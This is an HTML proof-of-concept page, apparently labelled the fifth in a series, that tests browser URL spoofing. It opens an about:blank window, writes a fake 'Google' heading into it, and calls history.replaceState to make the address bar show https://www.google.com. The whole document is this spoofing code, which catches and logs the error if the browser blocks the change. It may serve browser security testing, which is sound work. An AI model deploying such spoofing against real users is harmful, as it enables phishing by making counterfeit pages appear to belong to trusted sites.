<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC E - about:blank replaceState</title>
</head>
<body>

<h2>about:blank replaceState</h2>
<button onclick="run()">Run</button>

<script>
const TARGET = "https://www.google.com";

function run() {
  const w = window.open("about:blank");

  setTimeout(() => {
    w.document.write("<h1>FAKE GOOGLE PAGE</h1>");

    try {
      w.history.replaceState({}, "", TARGET);
    } catch(e) {
      console.log("Blocked:", e.message);
    }

  }, 200);
}
</script>

</body>
</html>
